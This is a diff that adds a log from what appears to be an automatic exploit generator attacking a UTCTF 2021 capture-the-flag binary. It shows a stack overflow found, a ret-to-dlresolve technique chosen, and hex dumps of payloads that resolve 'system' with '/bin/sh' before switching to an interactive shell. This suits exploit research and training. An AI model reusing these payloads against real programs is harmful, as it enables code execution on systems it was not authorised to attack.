@@ -1,0 +1,63 @@
+[*] '/home/user/bof_aeg/challenges/utctf2021_resolve'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] libc.so.6 found in custom_lib_dir, loading now
+[*] '/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Removing exist file /tmp/pwn/utctf2021_resolve_debug
+[+] PT_INTERP has changed from b'/lib64/ld-linux-x86-64.so.2\x00' to b'/tmp/ld.so.2'. Using temp file /tmp/pwn/utctf2021_resolve_debug
+[*] '/tmp/pwn/utctf2021_resolve_debug'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] set env={'LD_PRELOAD': '/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6', 'LD_LIBRARY_PATH': '/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/'} for debugging remote libc
+[x] Starting local process '/tmp/pwn/utctf2021_resolve_debug' env={b'LD_PRELOAD': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6', b'LD_LIBRARY_PATH': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/'} 
+[+] Starting local process '/tmp/pwn/utctf2021_resolve_debug' env={b'LD_PRELOAD': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6', b'LD_LIBRARY_PATH': b'/home/user/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/'} : pid 13012
+[*] Finding win...
+[*] No win found!
+[*] Finding stack bof...
+[*] Found vulnerable state.
+[*] Vuln_addr: 0x401159
+[*] Vuln_func(main): 0x401136
+[*] Trying tech{ret_to_libc}...
+[*] Loading gadgets for '/home/user/bof_aeg/challenges/utctf2021_resolve'
+[*] No stdout function available for leak.
+[*] Trying tech{ret_to_dlresolve}...
+[DEBUG] Symtab: 0x4003c0
+[DEBUG] Strtab: 0x400420
+[DEBUG] Versym: 0x40045e
+[DEBUG] Jmprel: 0x4004b8
+[DEBUG] ElfSym addr: 0x404e18
+[DEBUG] ElfRel addr: 0x404e38
+[DEBUG] Symbol name addr: 0x404e00
+[DEBUG] Version index addr: 0x400a90
+[DEBUG] Data addr: 0x404e00
+[DEBUG] PLT_INIT: 0x401020
+[DEBUG] Sent 0x200 bytes:
+    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    00000010  c3 11 40 00  00 00 00 00  00 4e 40 00  00 00 00 00  │··@·│····│·N@·│····│
+    00000020  44 10 40 00  00 00 00 00  c3 11 40 00  00 00 00 00  │D·@·│····│··@·│····│
+    00000030  50 4e 40 00  00 00 00 00  20 10 40 00  00 00 00 00  │PN@·│····│ ·@·│····│
+    00000040  10 03 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    00000050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    000001f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 0a  │····│····│····│····│
+    00000200
+[DEBUG] Sent 0x5a bytes:
+    00000000  73 79 73 74  65 6d 00 61  63 61 61 61  64 61 61 61  │syst│em·a│caaa│daaa│
+    00000010  65 61 61 61  66 61 61 61  e0 49 00 00  00 00 00 00  │eaaa│faaa│·I··│····│
+    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    00000030  6d 61 61 61  6e 61 61 61  00 4e 40 00  00 00 00 00  │maaa│naaa│·N@·│····│
+    00000040  07 00 00 00  19 03 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    00000050  2f 62 69 6e  2f 73 68 00  00 0a                     │/bin│/sh·│··│
+    0000005a
+[*] Switching to interactive mode
